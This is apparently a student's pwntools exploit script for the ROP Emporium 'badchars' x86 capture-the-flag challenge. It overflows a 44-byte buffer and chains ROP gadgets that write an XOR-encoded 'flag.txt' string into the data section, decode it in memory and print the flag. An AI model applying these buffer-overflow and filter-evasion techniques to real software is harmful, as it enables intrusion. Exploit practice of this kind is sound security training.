#Created to accomplish ROP Emporium badchars x86 challenge
#Code taken from previous activites as well as referencing 
#CryptoCat youtube channel.

from pwn import *

#establish the buffer length
buffer = 44

# function address
function = p32(0x08048538)          # print function 

# write location address
writeloc1 = 0x0804a018         # data section
writeloc2 = 0x0804a01c         # data section

# gadget address
mov_gadget = p32(0x0804854f)        # mov [edi],esi
pop_gadget = p32(0x080485b9)        # pop esi / edi / ebp

# null address
null_address = p32(0x00000000)

# xor'g the string
value_for_xor = 2
send_string = xor("flag.txt",value_for_xor)
print(send_string)
xor_function = p32(0x08048547)      # [ebp], bl
pop_data_ebp = p32(0x080485bb)                # put data address into ebp
pop_xor_val = p32(0x0804839d)                 # put 2 into ebx


# xor'd string dev
proc_string = b""
data_offset = 0x0
for c in send_string: 
    proc_string += pop_data_ebp 
    proc_string += p32(writeloc1 + data_offset)
    proc_string += pop_xor_val
    proc_string += p32(2)
    proc_string += xor_function
    data_offset += 1

# payload crafting
payload = flat(
    b"a" * buffer,
    pop_gadget,
    send_string[:4],
    p32(writeloc1),
    null_address,
    mov_gadget,

# second half of string
    pop_gadget,
    send_string[4:],
    p32(writeloc2),
    null_address,
    mov_gadget,

# xor the string
    proc_string,

# running the print function
    function,
    p32(writeloc1)
)

with open("badchartest.bin", "wb") as file1:
    file1.write(payload)

badchars = "/home/student/Desktop/badchars32/badchars32"
p = process(badchars)
p.send(payload)
print(p.recvall().decode('latin1'))
